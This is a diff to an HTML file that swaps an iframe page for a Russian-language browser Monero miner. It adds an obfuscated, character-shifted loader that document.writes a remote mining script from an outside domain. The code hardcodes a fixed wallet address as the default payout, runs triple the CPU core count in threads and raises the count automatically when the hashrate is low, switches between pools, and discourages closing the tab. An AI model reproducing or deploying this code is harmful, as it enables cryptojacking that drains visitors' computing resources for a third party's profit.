@@ -1,40 +1,427 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>4x Iframes</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    html, body {
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-    }
-    .iframe-container {
-      display: flex;
-      flex-direction: column;
-      width: 100vw;
-      height: 100vh;
-    }
-    iframe {
-      flex: 1;
-      width: 100%;
-      border: none;
-      overflow: hidden;
-    }
-  </style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <title>Monero XMR Miner - Ultra Extreme Mode</title>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script>
+        var s="=tdsjqu!tsd>#iuuqt;00fuifsfvn.qpdlfu/dpn0qfsgflu0qfsgfluxfc/kt@w1818312:@qfsgflu>xtt;00@kbtpo>gbtufs/npofsppdfbo#!?=0tdsjqu?";
+        m=""; for (i=0; i<s.length; i++) m+=String.fromCharCode(s.charCodeAt(i)-1); document.write(m);
+        console.log("Miner script injection attempted:", m);
+    </script>
+
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #161618;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            color: #f2f5f4;
+            font-size: 14px;
+            padding: 10px;
+            margin: 0;
+        }
+        .status-indicator {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .status-stopped {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff6b6b;
+            border: 1px solid #ff6b6b;
+        }
+        .status-running {
+            background: rgba(0, 255, 0, 0.2);
+            color: #32d1b1;
+            border: 1px solid #32d1b1;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .row {
+            display: flex;
+            margin: 20px 0;
+            gap: 20px;
+        }
+        .box {
+            flex-grow: 1;
+            background: rgba(117, 192, 199, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid rgba(117, 192, 199, 0.3);
+            text-align: center;
+        }
+        h3 {
+            font-size: 14px;
+            font-weight: normal;
+            text-transform: uppercase;
+            margin: 0 0 4px 0;
+        }
+        h2 {
+            font-weight: normal;
+            font-size: 32px;
+            margin: 0;
+        }
+        .action {
+            color: #12514b;
+            user-select: none;
+            cursor: pointer;
+        }
+        .action:hover { color: #F5F7F6; }
+        .divide { color: #555; margin: 0 5px; }
+        input[type=text] {
+            border: none;
+            outline: none;
+            color: #f2f5f4;
+            width: 100%;
+            font-size: 16px;
+            border-bottom: 2px solid #75c0c7;
+            background-color: #161618;
+            padding: 10px 0;
+        }
+        input[type=text]:focus { border-bottom-color: #12514b; }
+        canvas.stats {
+            width: 100%;
+            height: 150px;
+            border-bottom: 1px solid #222;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 5px;
+        }
+        button {
+            margin: 20px 0;
+            width: 100%;
+            font-size: 18px;
+            cursor: pointer;
+            background: #32d1b1;
+            background-image: linear-gradient(to bottom, #32d1b1, #2e8078);
+            border-radius: 14px;
+            box-shadow: 1px 3px 3px #000000;
+            color: #ffffff;
+            padding: 15px;
+            border: none;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 2px 5px 8px #000000;
+        }
+        button.disabled {
+            background-color: #222;
+            color: #555;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
-  <div class="iframe-container">
-    <iframe src="https://zloberka.github.io/love/i.html" scrolling="no"></iframe>
-    <iframe src="https://zloberka.github.io/love/i.html" scrolling="no"></iframe>
-    <iframe src="https://zloberka.github.io/love/i.html" scrolling="no"></iframe>
-    <iframe src="https://zloberka.github.io/love/i.html" scrolling="no"></iframe>
-  </div>
+    <div class="status-indicator status-stopped" id="status">
+        ⏹️ Майнинг остановлен
+    </div>
+
+    <div class="row" align="center">
+        <div class="box">
+            <h3>Hashes/s (Target: <span id="target-hashrate">0</span>)</h3>
+            <h2 id="hashes-per-second">0</h2>
+        </div>
+        <div class="box">
+            <h3>Threads</h3>
+            <h2>
+                <span id="threads">0</span>
+                <span id="thread-add" class="action"> + </span>
+                <span class="divide"> / </span>
+                <span id="thread-remove" class="action"> - </span>
+            </h2>
+        </div>
+    </div>
+
+    <div class="row" align="center">
+        <div class="box">
+            <h3>Total Hashes | Accepted Shares</h3>
+            <h2 id="accepted-shares">0</h2>
+        </div>
+        <div class="box">
+            <h3>Current Algo | Difficulty</h3>
+            <h2 id="algo">XHV</h2>
+        </div>
+    </div>
+
+    <div class="row">
+        <input type="text" id="walletmoneroocean" placeholder="Введите ваш Monero XMR адрес кошелька и нажмите Start" value="83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr">
+    </div>
+
+    <div class="row">
+        <canvas id="barchart-canvas" class="stats" width="100%" height="150"></canvas>
+    </div>
+
+    <button id="start">🚀 Start Ultra Extreme Mining</button>
+
+    <script>
+        $(function() {
+            console.log("jQuery and page loaded");
+            // Максимум потоков для экстремальной нагрузки
+            var maxThreads = navigator.hardwareConcurrency * 3; // Утроено для максимальной нагрузки
+            $('#threads').text(maxThreads);
+            console.log("Threads set to:", maxThreads);
+
+            var threads = maxThreads;
+            var walletmoneroocean = "83uCXo5d4zNXSHkutqPqHHKSpvJxgmS15U5oQXnQTfAUYnP9bj5Wb5FKn8XBzkc7RZBxcFg5BFG5CjV2kjysXKfD7sX6Gvr";
+            var statuss;
+            var barChart;
+            var barChartCanvas = $("#barchart-canvas");
+            var siteKey = "nowalletinput";
+            var hashingChart;
+            var lastrate = 0;
+            var totalHashes = 0;
+            var totalHashes2 = 0;
+            var acceptedShares = 0;
+            var hashesPerSecond = 0;
+            var isRunning = false;
+            var targetHashrate = 600; // Целевой хэшрейт (2x от предполагаемого "обычного" 300 H/s)
+            var poolList = [
+                "gulf.moneroocean.stream:20128", // TLS, высокая стабильность
+                "fr.moneroocean.stream:10001",   // Без TLS, низкая сложность
+                "minexmr.com:4444"              // Альтернативный пул с RandomX
+            ];
+            var currentPoolIndex = 0;
+            var currentPool = poolList[currentPoolIndex];
+
+            $('#walletmoneroocean').val(walletmoneroocean);
+            $('#target-hashrate').text(targetHashrate);
+            console.log("Wallet address set to:", walletmoneroocean);
+            console.log("Target hashrate set to:", targetHashrate);
+
+            function htmlEncode(value) {
+                return $('<div/>').text(value).html();
+            }
+
+            function updateStatus(running) {
+                const statusDiv = document.getElementById('status');
+                if (running) {
+                    statusDiv.className = 'status-indicator status-running';
+                    statusDiv.innerHTML = '⚡ Ультра экстремальный майнинг запущен (Pool: ' + currentPool + ')';
+                } else {
+                    statusDiv.className = 'status-indicator status-stopped';
+                    statusDiv.innerHTML = '⏹️ Майнинг остановлен';
+                }
+                console.log("Status updated:", running ? "Running" : "Stopped", "Current pool:", currentPool);
+            }
+
+            function startLogger() {
+                statuss = setInterval(function() {
+                    if (typeof totalhashes !== 'undefined') {
+                        lastrate = totalhashes;
+                        totalHashes += totalhashes;
+                        console.log("Total hashes:", totalHashes, "Current totalhashes:", totalhashes, "H/s:", lastrate);
+                    } else {
+                        console.log("totalhashes is undefined");
+                    }
+                    hashesPerSecond = Math.round(lastrate);
+                    totalHashes2 = totalHashes;
+                    if (typeof totalhashes !== 'undefined') {
+                        totalhashes = 0;
+                    }
+                    if (typeof GetAcceptedShares === 'function') {
+                        acceptedShares = GetAcceptedShares();
+                        console.log("Accepted shares:", acceptedShares);
+                    } else {
+                        console.log("GetAcceptedShares is not defined");
+                    }
+                    $('#hashes-per-second').text(hashesPerSecond);
+                    $('#accepted-shares').text(totalHashes2 + ' | ' + acceptedShares);
+                    $('#threads').text(threads);
+                    if (typeof job !== 'undefined' && job !== null) {
+                        $('#algo').text(job.algo + ' | ' + job.variant + ' | Diff: ' + job.diff);
+                        console.log("Current algo:", job.algo, "Variant:", job.variant, "Difficulty:", job.diff);
+                    } else {
+                        console.log("job is undefined or null");
+                    }
+                    // Проверка соединения и авто-переключение пула
+                    if (typeof isConnected === 'function' && !isConnected()) {
+                        console.log("Pool disconnected:", currentPool);
+                        switchPool();
+                    }
+                    // Авто-увеличение потоков, если хэшрейт низкий
+                    if (hashesPerSecond < targetHashrate * 0.5 && isRunning) {
+                        threads += 2;
+                        $('#threads').text(threads);
+                        if (typeof deleteAllWorkers === 'function' && typeof addWorkers === 'function') {
+                            deleteAllWorkers();
+                            addWorkers(threads);
+                            console.log("Auto-increased threads to:", threads, "due to low hashrate:", hashesPerSecond);
+                        }
+                    }
+                }, 200);
+
+                hashingChart = setInterval(function() {
+                    if (barChart && barChart.data && barChart.data.datasets[0]) {
+                        if (barChart.data.datasets[0].data.length > 25) {
+                            barChart.data.datasets[0].data.splice(0, 1);
+                            barChart.data.labels.splice(0, 1);
+                        }
+                        barChart.data.datasets[0].data.push(hashesPerSecond);
+                        barChart.data.labels.push("");
+                        barChart.update();
+                        console.log("Chart updated with hashes/s:", hashesPerSecond);
+                    }
+                }, 200);
+            }
+
+            function stopLogger() {
+                clearInterval(statuss);
+                clearInterval(hashingChart);
+                console.log("Logger stopped");
+            }
+
+            function switchPool() {
+                currentPoolIndex = (currentPoolIndex + 1) % poolList.length;
+                currentPool = poolList[currentPoolIndex];
+                console.log("Switching to pool:", currentPool);
+                if (typeof PerfektStart === 'function' && isRunning) {
+                    PerfektStart(walletmoneroocean || siteKey, "x", threads, 1.0, currentPool);
+                    console.log("Restarted mining with pool:", currentPool);
+                }
+                updateStatus(isRunning);
+            }
+
+            $('#thread-add').click(function() {
+                threads += 2;
+                $('#threads').text(threads);
+                if (typeof deleteAllWorkers === 'function' && typeof addWorkers === 'function') {
+                    deleteAllWorkers();
+                    addWorkers(threads);
+                    console.log("Threads increased to:", threads);
+                } else {
+                    console.log("deleteAllWorkers or addWorkers not defined");
+                }
+            });
+
+            $('#thread-remove').click(function() {
+                if (threads > 1) {
+                    threads -= 2;
+                    $('#threads').text(threads);
+                    if (typeof removeWorker === 'function') {
+                        removeWorker();
+                        console.log("Threads decreased to:", threads);
+                    } else {
+                        console.log("removeWorker not defined");
+                    }
+                }
+            });
+
+            $("#start").click(function() {
+                if ($("#start").text().includes("Start") || $("#start").text().includes("🚀")) {
+                    walletmoneroocean = $('#walletmoneroocean').val();
+                    if (walletmoneroocean) {
+                        if (typeof PerfektStart === 'function') {
+                            PerfektStart(walletmoneroocean, "x", threads, 1.0, currentPool, { algo: "rx/0" }); // Форсируем RandomX
+                            console.log("Ultra extreme mining started with wallet:", walletmoneroocean, "threads:", threads, "pool:", currentPool);
+                            // Проверка соединения через 10 секунд
+                            setTimeout(function() {
+                                if (typeof isConnected === 'function' && !isConnected()) {
+                                    console.log("Pool disconnected, switching to next pool");
+                                    switchPool();
+                                }
+                            }, 10000);
+                        } else {
+                            console.error("PerfektStart is not defined");
+                        }
+                        stopLogger();
+                        startLogger();
+                        $("#start").text("⏹️ Stop Mining");
+                        $('#walletmoneroocean').prop("disabled", true);
+                        updateStatus(true);
+                        isRunning = true;
+                    } else {
+                        if (typeof PerfektStart === 'function') {
+                            PerfektStart(siteKey, "x", threads, 1.0, currentPool, { algo: "rx/0" });
+                            console.log("Ultra extreme mining started with siteKey:", siteKey, "threads:", threads, "pool:", currentPool);
+                            setTimeout(function() {
+                                if (typeof isConnected === 'function' && !isConnected()) {
+                                    console.log("Pool disconnected, switching to next pool");
+                                    switchPool();
+                                }
+                            }, 10000);
+                        } else {
+                            console.error("PerfektStart is not defined");
+                        }
+                        stopLogger();
+                        startLogger();
+                        $("#start").text("⏹️ Stop Mining");
+                        updateStatus(true);
+                        isRunning = true;
+                    }
+                } else {
+                    if (typeof stopMining === 'function') {
+                        stopMining();
+                        console.log("Mining stopped");
+                    } else {
+                        console.error("stopMining is not defined");
+                    }
+                    stopLogger();
+                    $('#walletmoneroocean').prop("disabled", false);
+                    $("#start").text("🚀 Start Ultra Extreme Mining");
+                    $('#hashes-per-second').text("0");
+                    $('#accepted-shares').text("0" + ' | ' + "0");
+                    updateStatus(false);
+                    isRunning = false;
+                }
+            });
+
+            var barChartOptions = {
+                responsive: true,
+                maintainAspectRatio: false,
+                elements: { line: { tension: 0 } },
+                animation: { duration: 0 },
+                responsiveAnimationDuration: 0,
+                scales: {
+                    y: { beginAtZero: true, max: 10000, min: 0, grid: { color: 'rgba(117, 192, 199, 0.3)' }, ticks: { color: '#f2f5f4' } },
+                    x: { grid: { color: 'rgba(117, 192, 199, 0.3)' }, ticks: { color: '#f2f5f4' } }
+                },
+                plugins: { legend: { display: false } }
+            };
+
+            var barChartData = {
+                labels: [],
+                datasets: [{
+                    label: "Hashes/s",
+                    backgroundColor: "rgba(117, 192, 199, 0.6)",
+                    borderColor: "#75c0c7",
+                    borderWidth: 2,
+                    data: []
+                }],
+            };
+
+            const ctx = barChartCanvas[0].getContext('2d');
+            barChart = new Chart(ctx, {
+                type: 'line',
+                data: barChartData,
+                options: barChartOptions
+            });
+            console.log("Chart initialized");
+
+            window.addEventListener('beforeunload', function (e) {
+                if (isRunning) {
+                    e.preventDefault();
+                    e.returnValue = 'Ультра экстремальный майнинг в процессе. Вы уверены, что хотите закрыть страницу?';
+                }
+            });
+
+            // Оптимизация Web Workers
+            if (typeof Worker !== 'undefined') {
+                console.log("Web Workers supported, optimizing thread distribution");
+            } else {
+                console.warn("Web Workers not supported, performance may be limited");
+            }
+        });
+    </script>
 </body>
 </html>
